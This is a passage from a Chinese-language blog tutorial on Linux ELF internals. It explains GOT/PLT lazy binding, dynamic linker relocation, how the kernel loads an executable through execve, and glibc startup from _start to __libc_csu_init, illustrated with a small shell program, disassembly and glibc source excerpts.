<p><strong>注意，延迟绑定一般只出先在未开启 FULL RELRO 的时候，如果开启 FULL RELRO 则 got 表不可写，程序在装载时完成 got 表的重定位。当然特殊情况也有在开启 FULL RELRO 的时候进行重定位，比如 ret2dlresolve 。</strong></p>
<p>我们以调用 <code>puts</code> 函数为例讲解一下延迟绑定的过程。</p>
<p>首先第一次调用 <code>puts</code> 时由于 <code>puts@got</code> 没有进行重定位，因此会调用 <code>_dl_runtime_resolve</code> 函数进行重定位，<code>_dl_runtime_resolve</code> 函数将查找到的 <code>puts</code> 函数地址填写到 <code>puts@got</code> 后会调用 <code>puts</code> 函数。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004319385.png"
                      alt="image-20241108004319385"
                ><br>再次调用 <code>puts</code> 函数时由于 <code>puts@got</code> 已经完成重定位，因此会直接调用 <code>puts</code> 函数。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004343509.png"
                      alt="image-20241108004343509"
                ><br>其中在第一次调用 <code>puts</code> 函数时调用的 <code>_dl_runtime_resolve</code> 函数的具体实现为：</p>
<ul>
<li>用第一个参数 <code>link_map</code> 访问 <code>.dynamic</code> ，取出 <code>.dynstr</code> ， <code>.dynsym</code> ， <code>.rel.plt</code> 的指针。</li>
<li><code>.rel.plt + 第二个参数</code> 求出当前函数的重定位表项 <code>Elf32_Rel</code> 的指针，记作 <code>rel</code> 。</li>
<li><code>rel-&gt;r_info &gt;&gt; 8</code> 作为 <code>.dynsym</code> 的下标，求出当前函数的符号表项 <code>Elf32_Sym</code> 的指针，记作 <code>sym</code> 。</li>
<li><code>.dynstr + sym-&gt;st_name</code> 得出符号名字符串指针。</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给 <code>*rel-&gt;r_offset</code> ，即 GOT 表。</li>
<li>调用这个函数。</li>
</ul>
<h3 id="动态链接的步骤和实现"><a href="#动态链接的步骤和实现" class="headerlink" title="动态链接的步骤和实现"></a>动态链接的步骤和实现</h3><h4 id="动态链接器自举"><a href="#动态链接器自举" class="headerlink" title="动态链接器自举"></a>动态链接器自举</h4><p>由于动态链接器本身的作用是重定位，因此自身的重定位也需要自身来完成，完成自身重定位的过程成为自举（Bootstrap）。</p>
<p>动态链接器入口地址即是自举代码的入口，当操作系统将进程控制权交给动态链接器时，动态链接器的自举代码即开始执行。自举代码首先会找到它自己的 GOT 。而 GOT 的第一个入口保存的即是 <code>.dynamic</code> 段的偏移地址，由此找到了动态连接器本身的“.dynamic”段。通过 <code>.dynamic</code> 中的信息，自举代码便可以获得动态链接器本身的重定位表和符号表等，从而得到动态链接器本身的重定位入口，先将它们全部重定位。</p>
<p>从这一步开始，动态链接器代码中才可以开始使用自己的全局变量和静态变量。</p>
<h4 id="装载共享对象"><a href="#装载共享对象" class="headerlink" title="装载共享对象"></a>装载共享对象</h4><p>完成基本自举以后，动态链接器将可执行文件和链接器本身的符号表都合并到一个符号表当中，我们可以称它为全局符号表（Global Symbol Table）。然后链接器开始寻找可执行文件所依赖的共享对象，我们前面提到过 <code>.dynamic</code> 段中，有一种类型的入口是 <code>DT_NEEDED</code> ，它所指出的是该可执行文件（或共享对象）所依赖的共享对象。由此，链接器可以列出可执行文件所需要的所有共享对象，并将这些共享对象的名字放入到一个装载集合中。然后链接器开始从集合里取一个所需要的共享对象的名字，找到相应的文件后打开该文件，读取相应的 ELF 文件头和 <code>.dynamic</code> 段，然后将它相应的代码段和数据段映射到进程空间中。</p>
<p>如果这个 ELF 共享对象还依赖于其他共享对象，那么将所依赖的共享对象的名字放到装载集合中。如此循环直到所有依赖的共享对象都被装载进来为止，当然链接器可以有不同的装载顺序，如果我们把依赖关系看作一个图的话，那么这个装载过程就是一个图的遍历过程，链接器可能会使用深度优先或者广度优先或者其他的顺序来遍历整个图，这取决于链接器，比较常见的算法一般都是广度优先的。</p>
<p>当一个新的共享对象被装载进来的时候，它的符号表会被合并到全局符号表中，所以当所有的共享对象都被装载进来的时候，全局符号表里面将包含进程中所有的动态链接所需要的符号。</p>
<h4 id="重定位和初始化"><a href="#重定位和初始化" class="headerlink" title="重定位和初始化"></a>重定位和初始化</h4><p>当上面的步骤完成之后，链接器开始重新遍历可执行文件和每个共享对象的重定位表，将它们的 GOT&#x2F;PLT 中的每个需要重定位的位置进行修正。因为此时动态链接器已经拥有了进程的全局符号表，所以这个修正过程也显得比较容易，跟我们前面提到的地址重定位的原理基本相同。</p>
<p>动态链接重定位除了前面静态链接重定位类型外还有如下重定位类型：</p>
<ul>
<li><code>R_386_RELATIVE</code>：针对下面这种代码的重定位，由于加载地址不确定，需要加载后的才能确定。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> a;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span>* p = &amp;a;</span><br></pre></td></tr></table></figure></div></li>
<li><code>R_386_GLOB_DAT</code>：位于 <code>.got</code> 的重定位入口，只需要填入正确变量地址即可。</li>
<li><code>R_386_JUMP_SLOT</code>：位于 <code>.got.plt</code> 的重定位入口，只需要填入正确的函数地址即可。</li>
</ul>
<p>重定位完成之后，如果某个共享对象有 <code>.init</code> 段，那么动态链接器会执行 <code>.init</code> 段中的代码，用以实现共享对象特有的初始化过程，比如最常见的，共享对象中的 C++ 的全局&#x2F;静态对象的构造就需要通过 <code>.init</code> 来初始化。相应地，共享对象中还可能有 <code>.fini</code> 段，当进程退出时会执行 <code>.fini</code> 段中的代码，可以用来实现类似 C++ 全局对象析构之类的操作。</p>
<p>如果进程的可执行文件也有 <code>.init</code> 段，那么动态链接器不会执行它，因为可执行文件中的 <code>.init</code> 段和 <code>.fini</code> 段由程序初始化部分代码负责执行。当完成了重定位和初始化之后，所有的准备工作就宣告完成了，所需要的共享对象也都已经装载并且链接完成了，这时候动态链接器就如释重负，将进程的控制权转交给程序的入口并且开始执行。</p>
<h1 id="装载"><a href="#装载" class="headerlink" title="装载"></a>装载</h1><h2 id="Linux-内核装载-ELF-过程"><a href="#Linux-内核装载-ELF-过程" class="headerlink" title="Linux 内核装载 ELF 过程"></a>Linux 内核装载 ELF 过程</h2><p>首先在用户层面，bash 进程会调用 <code>fork()</code> 系统调用创建一个新的进程，然后新的进程调用 <code>execve()</code> 系统调用执行指定的 ELF 文件，原先的 bash 进程继续返回等待刚才启动的新进程结束，然后继续等待用户输入命令。</p>
<p><code>execve()</code> 系统调用被定义在 <code>unistd.h</code> ，它的原型如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Replace the current process, executing PATH with arguments ARGV and</span></span><br><span class="line"><span class="comment">   environment ENVP.  ARGV and ENVP are terminated by NULL pointers.  */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__path, <span class="type">char</span> *<span class="type">const</span> __argv[], <span class="type">char</span> *<span class="type">const</span> __envp[])</span>;</span><br></pre></td></tr></table></figure></div>
<p>它的三个参数分别是被执行的程序文件名、执行参数和环境变量。</p>
<p>Glibc 对 <code>execvp()</code> 系统调用进行了包装，提供了 <code>execl()</code> 、<code>execlp()</code> 、<code>execle()</code> 、<code>execv()</code> 和 <code>execvp()</code> 等5个不同形式的 <code>exec</code> 系列 API ，它们只是在调用的参数形式上有所区别，但最终都会调用到 <code>execve()</code> 这个系统调用。下面是一个简单的使用 <code>fork()</code> 和 <code>execlp()</code> 实现的 minibash ：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_COMMAND_LENGTH 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> command[MAX_COMMAND_LENGTH];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;minibash$ &quot;</span>);</span><br><span class="line">        fgets(command, <span class="keyword">sizeof</span>(command), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除换行符</span></span><br><span class="line">        command[<span class="built_in">strcspn</span>(command, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查是否输入了退出命令</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(command, <span class="string">&quot;exit&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strlen</span>(command) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">pid_t</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 子进程执行命令</span></span><br><span class="line">            <span class="keyword">if</span> (execlp(command, command, <span class="literal">NULL</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;minibash&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 父进程等待子进程结束</span></span><br><span class="line">            <span class="type">int</span> status;</span><br><span class="line">            waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// fork失败</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在进入 <code>execve()</code> 系统调用之后，Linux 内核就开始进行真正的装载工作。在内核中， <code>execve()</code> 系统调用相应的入口是 sys_execve()， 它被定义在 <code>arch\i386\kernel\Process.c</code> 。<code>sys_execve()</code> 进行一些参数的检查复制之后，调用 <code>do_execve()</code> 。<code>do_execve()</code> 会首先查找被执行的文件，如果找到文件，则 <code>do_execve()</code> 读取文件的前128个字节判断文件的格式，每种可执行文件的格式的开头几个字节都是很特殊的，特别是开头4个字节，常常被称做魔数（Magic Number），通过对魔数的判断可以确定文件的格式和类型。比如 ELF 的可执行文件格式的头 4 个字节为 <code>\x7felf</code> ；而 Java 的可执行文件格式的头4个字节为 <code>cafe</code> ；如果被执行的是 Shell 脚本或 perl 、python 等这种解释型语言的脚本，那么它的第一行往往是 <code>#!/bin/sh</code> 或 <code>#!/usr/bin/perl</code> 或 <code>#!/usr/bin/python</code> ，这时候前两个字节 <code>#</code> 和 <code>!</code> 就构成了魔数，系统一旦判断到这两个字节，就对后面的字符串进行解析，以确定具体的解释程序的路径。</p>
<p>当 <code>do_execve()</code> 读取了这 128 个字节的文件头部之后，然后调用 <code>search_binary_handle()</code> 去搜索和匹配合适的可执行文件装载处理过程。Linux中所有被支持的可执行文件格式都有相应的装载处理过程， <code>search_binary_handle()</code> 会通过判断文件头部的魔数确定文件的格式，并且调用相应的装载处理过程。比如 ELF 可执行文件的装载处理过程叫做 <code>load_elf_binary()</code>； a.out 可执行文件的装载处理过程叫做 <code>load_aout_binary()</code>；而装载可执行脚本程序的处理过程叫做 <code>load_script()</code> 。 这里我们只关心 ELF 可执行文件的装载， <code>load_elf_binary()</code> 被定义在 <code>fs/Binfmt_elf.c</code> ，这个函数的代码比较长，它的主要步骤是：</p>
<ul>
<li>检查ELF可执行文件格式的有效性，比如魔数、程序头表中段（Segment）的数量。</li>
<li>寻找动态链接的 <code>.interp</code> 段，设置动态链接器路径。</li>
<li>根据 ELF 可执行文件的<strong>程序头表</strong>的描述，对 ELF 文件进行映射，比如代码、数据、只读数据。</li>
<li>初始化 ELF 进程环境，比如进程启动时 EDX 寄存器的地址应该是 <code>DT_FINI</code> 的地址（参照动态链接）。</li>
<li>将系统调用的返回地址修改成 ELF 可执行文件的入口点，这个入口点取决于程序的链接方式，对于<strong>静态链接</strong>的 ELF 可执行文件，这个程序入口就是 ELF 文件的文件头中 <strong><code>e_entry</code> 所指的地址</strong>；对于<strong>动态链接</strong>的 ELF 可执行文件，程序入口点是<strong>动态链接器</strong>。</li>
</ul>
<p>当 <code>load_elf_binary()</code> 执行完毕，返回至 <code>do_execve()</code> 再返回至 <code>sys_execve()</code> 时，上面的第 5 步中已经把系统调用的返回地址改成了被装载的 ELF 程序的入口地址了。所以当 <code>sys_execve()</code> 系统调用从内核态返回到用户态时，EIP 寄存器直接跳转到了 ELF 程序的入口地址，于是新的程序开始执行，ELF 可执行文件装载完成。</p>
<h2 id="进程虚拟地址空间"><a href="#进程虚拟地址空间" class="headerlink" title="进程虚拟地址空间"></a>进程虚拟地址空间</h2><p>在现代操作系统中，每个进程都有自己的虚拟地址空间，这是一个抽象的地址空间，由连续的虚拟地址组成。每个进程在其虚拟地址空间中运行，不会直接访问物理内存地址。</p>
<p>操作系统将每个进程的虚拟地址空间划分为多个区域，例如代码段、数据段、堆和栈等。每个区域具有特定的用途和权限。</p>
<ul>
<li>代码段：包含可执行程序的机器指令。</li>
<li>数据段：包含静态和全局变量的初始值。</li>
<li>BSS 段：包含需要初始化为零的静态和全局变量。</li>
<li>动态链接段：包含动态链接所需的信息。</li>
</ul>
<p>加载器将这些段从 ELF 文件中复制到相应的虚拟内存地址，并建立虚拟地址与物理内存地址的映射关系。</p>
<h2 id="execve-系列函数之间的区别"><a href="#execve-系列函数之间的区别" class="headerlink" title="execve 系列函数之间的区别"></a>execve 系列函数之间的区别</h2><p><code>execve</code> 和其他 <code>exec</code> 系列函数（<code>execl</code>, <code>execlp</code>, <code>execle</code>, <code>execv</code>, <code>execvp</code>, <code>execvpe</code>）是 UNIX 和 Linux 系统编程中用于执行程序的重要工具。它们都用于在当前进程中加载并执行一个新程序，从而完全替换当前进程的内存空间、数据、堆栈等内容，但进程ID保持不变。这些函数通常用于需要替换当前执行的程序的情况，如 shell 实现中运行外部命令。</p>
<h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>所有这些函数最终都会调用系统的 <code>execve</code> 系统调用。<code>execve</code> 是实现其他 <code>exec</code> 函数的底层基础。当调用任一 <code>exec</code> 函数时，当前进程的地址空间将被新程序替换，但进程的 PID 保持不变。这意味着新程序将继续使用调用 <code>exec</code> 的进程的 PID，并从 <code>main()</code> 函数开始执行，而原进程的所有代码和数据则被新程序的代码和数据所替换。</p>
<h3 id="函数差异"><a href="#函数差异" class="headerlink" title="函数差异"></a>函数差异</h3><ul>
<li><p><strong>execve</strong></p>
<ul>
<li><strong>原型</strong>：<code>int execve(const char *pathname, char *const argv[], char *const envp[]);</code></li>
<li><strong>参数</strong>：<ul>
<li><code>pathname</code>：要执行的程序路径。</li>
<li><code>argv</code>：传递给新程序的参数数组，以 NULL 结尾。</li>
<li><code>envp</code>：传递给新程序的环境变量数组，以 NULL 结尾。</li>
</ul>
</li>
<li><strong>特点</strong>：是唯一一个直接系统调用的 <code>exec</code> 函数，其他 <code>exec</code> 函数最终都是通过调用 <code>execve</code> 实现的。</li>
</ul>
</li>
<li><p><strong>execl, execlp, execle</strong></p>
<ul>
<li><strong>特点</strong>：这些函数允许直接在函数调用中列出参数，而不是通过数组传递。</li>
<li><code>execl</code> 和 <code>execle</code> 需要提供程序的完整路径，而 <code>execlp</code> 在 PATH 环境变量中搜索程序名。</li>
<li><code>execle</code> 允许直接指定环境变量。</li>
</ul>
</li>
<li><p><strong>execv, execvp, execvpe</strong></p>
<ul>
<li><strong>特点</strong>：这些函数通过数组传递参数给新程序。</li>
<li><code>execv</code> 需要提供程序的完整路径。</li>
<li><code>execvp</code> 和 <code>execvpe</code> 在 PATH 环境变量中搜索程序名。</li>
<li><code>execvpe</code> 类似于 <code>execvp</code>，但允许指定环境变量。</li>
</ul>
</li>
</ul>
<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ul>
<li><strong>execve</strong>：需要精确控制新程序的环境变量时使用。</li>
<li><strong>execl, execlp, execle</strong>：当参数数量已知且不需要动态构建参数数组时使用。</li>
<li><strong>execv, execvp, execvpe</strong>：当参数以数组形式提前构建好或在程序中动态生成时使用。</li>
</ul>
<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><h2 id="进程栈的初始化"><a href="#进程栈的初始化" class="headerlink" title="进程栈的初始化"></a>进程栈的初始化</h2><p>我们知道进程刚开始启动的时候，须知道一些进程运行的环境，最基本的就是系统环境变量和进程的运行参数。很常见的一种做法是操作系统在进程启动前将这些信息提前保存到进程的虚拟空间的栈中。</p>
<p>假设我们运行如下命令，即运行 <code>ls</code> 程序，传入的参数为 <code>/home</code> 。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /home</span><br></pre></td></tr></table></figure></div>
<p>在程序初始状态的栈如下图所示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004415525.png"
                      alt="image-20241108004415525"
                ><br>栈顶寄存器 rsp 指向的位置是初始化以后堆栈的顶部，最前面的 8 个字节表示<strong>命令行参数的数量</strong>，我们的例子里面是两个，即 <code>/usr/bin/ls</code> 和 <code>/home</code> ，紧接的就是分布指向这两个参数字符串的<strong>指针</strong>；后面跟了一个0；接着是一个以 0 结尾的指向环境变量字符串的指针数组。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0b14b8f7b214bfb36efc1979d4c50b10.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                >
进程在启动以后，程序的库部分会把堆栈里的初始化信息中的参数信息传递给 `main()` 函数，也就是我们熟知的 `main()` 函数的两个 `argc` 和 `argv` 两个参数，这两个参数分别对应这里的命令行参数数量和命令行参数字符串指针数组。

<h2 id="main-函数之外的代码"><a href="#main-函数之外的代码" class="headerlink" title="main 函数之外的代码"></a>main 函数之外的代码</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004734754.png"
                      alt="image-20241108004734754"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004754680.png"
                      alt="image-20241108004754680"
                ><br>当运行程序时，shell 或 gui 调用 <code>execve()</code> ，它执行 linux 系统调用 <code>execve()</code> 设置一个堆栈，并将 <code>argc</code> 、 <code>argv</code> 和 <code>envp</code> 压入其中。文件描述 0、1 和 2（<code>stdin</code> 、<code>stdout</code> 、<code>stderr</code>)保留为 shell 设置的值，动态链接器完成重定位工作。当一切准备就绪后，通过调用 <code>_start()</code> 将控制权交给程序。</p>
<p>一般情况下 ELF 的入口点为 <code>_start</code> 函数，这个函数的主要作用是设置 <code>___libc_start_main</code> 函数的所需参数。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08049080 endbr32</span><br><span class="line">.text:08049084 xor     ebp, ebp                        ; 设置 ebp 为 0 表示最外层栈</span><br><span class="line">.text:08049086 pop     esi                             ; argc</span><br><span class="line">.text:08049087 mov     ecx, esp                        ; argv</span><br><span class="line">.text:08049089 and     esp, 0FFFFFFF0h                 ; 栈对齐</span><br><span class="line">.text:0804908C push    eax                             ; 静态链接程序默认为 0 ，动态链接程序默认为模块对应的 link_map</span><br><span class="line">.text:0804908D push    esp                             ; stack_end</span><br><span class="line">.text:0804908E push    edx                             ; rtld_fini</span><br><span class="line">.text:0804908F call    sub_80490B7</span><br><span class="line">.text:0804908F</span><br><span class="line">.text:08049094 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $); ebx = offset _GLOBAL_OFFSET_TABLE_</span><br><span class="line">.text:0804909A lea     eax, (__libc_csu_fini - 804C000h)[ebx] ; (__libc_csu_fini - _GLOBAL_OFFSET_TABLE_)[ebx]</span><br><span class="line">.text:080490A0 push    eax                             ; fini</span><br><span class="line">.text:080490A1 lea     eax, (__libc_csu_init - 804C000h)[ebx] ; (__libc_csu_init - _GLOBAL_OFFSET_TABLE_)[ebx]</span><br><span class="line">.text:080490A7 push    eax                             ; init</span><br><span class="line">.text:080490A8 push    ecx                             ; ubp_av</span><br><span class="line">.text:080490A9 push    esi                             ; argc</span><br><span class="line">.text:080490AA mov     eax, offset main</span><br><span class="line">.text:080490B0 push    eax                             ; main</span><br><span class="line">.text:080490B1 call    ___libc_start_main</span><br><span class="line">.text:080490B1</span><br><span class="line">.text:080490B6 hlt</span><br><span class="line">.text:080490B7 sub_80490B7 proc near                   ; CODE XREF: _start+F↑p</span><br><span class="line">.text:080490B7 mov     ebx, [esp]</span><br><span class="line">.text:080490BA retn</span><br></pre></td></tr></table></figure></div>
<p>之后调用 <code>__libc_start_main</code> 函数，通过调试发现使用 glibc-2.23 的 32 位程序实际调用的是 <code>generic_start_main</code> 函数，该函数位于 <code>csu/libc-start.c</code> 中，定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> LIBC_START_MAIN generic_start_main</span></span><br><span class="line"></span><br><span class="line">STATIC <span class="type">int</span></span><br><span class="line"><span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params">		 <span class="type">int</span> argc, <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">		 __typeof (main) init,</span></span><br><span class="line"><span class="params">		 <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params">		 <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span></span><br></pre></td></tr></table></figure></div>
<p>可见和 <code>_start</code> 函数里的调用一致，一共有 7 个参数，其中 <code>main</code> 由第一个参数传入，紧接着是 <code>argc</code> 和 <code>argv</code>（这里称为 <code>ubp_av</code> ，因为其中还包含了环境变量表）。除了 <code>main</code> 的函数指针之外，外部还要传入 3 个函数指针，分别是：</p>
<ul>
<li><code>init</code>：<code>main</code> 调用前的初始化工作，默认是 <code>__libc_csu_init</code> 函数指针。</li>
<li><code>fini</code>：<code>main</code> 结束后的收尾工作，默认是 <code>__libc_csu_fini</code> 函数指针。</li>
<li><code>rtld_fini</code>：和动态加载有关的收尾工作，<code>rtld</code> 是 runtime loader 的缩写。如果是动态链接程序默认是 <code>_dl_fini</code> 函数指针，如果是静态链接程序默认为 NULL 。</li>
</ul>
<p>最后的 <code>stack_end</code> 标明了栈底的地址，即最高的栈地址。</p>
<p>首先初始化 <code>__libc_multiple_libcs</code> 为 0 之后 <code>generic_start_main</code> 会调用 <code>__cxa_atexit </code> 将 <code>rtld_fini</code> 注册为 <code>main</code> 函数结束后的回调函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_likely (rtld_fini != <span class="literal">NULL</span>))</span><br><span class="line">  __cxa_atexit ((<span class="type">void</span> (*) (<span class="type">void</span> *)) rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></div>
<p>当然如果是静态链接程序还会做一些额外的初始化，在动态链接程序中这些初始化是在动态连接器中完成的。</p>
<ul>
<li>如果是开启 PIE 的静态程序会调用 <code>_dl_relocate_static_pie</code> 函数初始化 <code>link_map</code> 并且进行重定位。</li>
<li>初始化 <code>__environ</code> 。</li>
<li>初始化 <code>__libc_stack_end</code> 。</li>
<li>调用 <code>dl_aux_init</code> 根据栈上的<strong>辅助信息数组</strong>做相关的初始化工作。</li>
<li>如果<strong>程序头表</strong>指针 <code>dl_phdr</code> 没有初始化，就通过 ELF 文件头的 <code>e_phoff</code> 初始化 <code>dl_phdr</code>（程序头表地址），通过 <code>e_phnum</code> 初始化 <code>dl_phnum</code>（程序头表中的项数）。不过这个一般在上一步根据栈上的<strong>辅助信息数组</strong>做相关的初始化工作时就已经初始化过了。</li>
<li>调用 <code>_libc_init_secure</code> 函数，如果 <code>_libc_enable_secure_decided</code> 不为 0 则初始化 <code>_libc_enable_secure</code> 为 <code>(__geteuid() != __getuid() || __getegid() != __getgid())</code> 。<ul>
<li><code>__geteuid() != __getuid()</code>：比较有效用户 ID（effective user ID）和实际用户 ID（real user ID）。如果它们不相等，表示当前进程以特权用户身份运行（比如以 root 用户权限运行）。</li>
<li><code>__getegid() != __getgid()</code>：比较有效组 ID（effective group ID）和实际组 ID（real group ID）。如果它们不相等，表示当前进程以特权用户组身份运行。</li>
<li>这段代码的目的是判断当前进程是否以特权用户或特权用户组身份运行。这在某些情况下可能需要采取不同的安全措施或限制特权操作。</li>
</ul>
</li>
<li>调用 <code>__tunables_init</code> 函数从环境变量中提取信息，并用于初始化可调节项列表，以便在程序运行时可以根据这些可调节项来进行相应的配置或调整。</li>
<li>使用 <code>ARCH_INIT_CPU_FEATURES</code> 宏初始化 CPU 的相关参数到 <code>cpu_features</code> 类型的结构体 <code>_dl_x86_cpu_features</code> 中。</li>
<li>重定位代码中的绝对地址引用 。</li>
<li>调用 <code>__libc_setup_tls</code> 函数初始化 tls 。</li>
<li>如果 <code>__libc_multiple_libcs</code> 为 0 则调用 <code>DL_SYSDEP_OSCHECK</code> 宏来初始化 <code>dl_osversion</code> 为内核版本号。</li>
<li>调用 <code>__pthread_initialize_minimal</code> 函数初始化线程库 。</li>
<li>初始化 <code>__stack_chk_guard</code> 。</li>
<li>初始化 <code>pointer_chk_guard</code> 。</li>
<li>调用 <code>_libc_init_first</code> 函数初始化 <code>_libc_argc</code> ，<code>_libc_argv</code> 和 <code>environ</code> 等。</li>
<li>调用 <code>__cxa_atexit</code> 函数将 <code>fini</code> 注册为 <code>main</code> 函数结束后的回调函数 。</li>
</ul>
<p>之后判断函数指针 <code>init</code> 是否为空，如果不为空则调用该函数指针，也就是 <code>__libc_csu_init</code> 函数。</p>
<p><code>__libc_csu_init</code> 函数定义在 <code>csu/elf-init.c</code> 中，内容如下：</p>
<ul>
<li>如果是<strong>静态链接程序</strong>会依次调用函数指针数组 <code>__preinit_array_start </code> 中的所有函数。</li>
<li>调用 <code>_init </code> 函数。</li>
<li>依次调用函数指针数组 <code>__init_array_start</code>（<code>.init_array</code>）中的所有函数。<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_csu_init (<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* For dynamically linked executables the preinit array is executed by</span></span><br><span class="line"><span class="comment">     the dynamic linker (before initializing any shared object).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LIBC_NONSHARED</span></span><br><span class="line">  <span class="comment">/* For static executables, preinit happens right before init.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> size = __preinit_array_end - __preinit_array_start;</span><br><span class="line">    <span class="type">size_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">      (*__preinit_array_start [i]) (argc, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NO_INITFINI</span></span><br><span class="line">  _init ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> size = __init_array_end - __init_array_start;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">      (*__init_array_start [i]) (argc, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
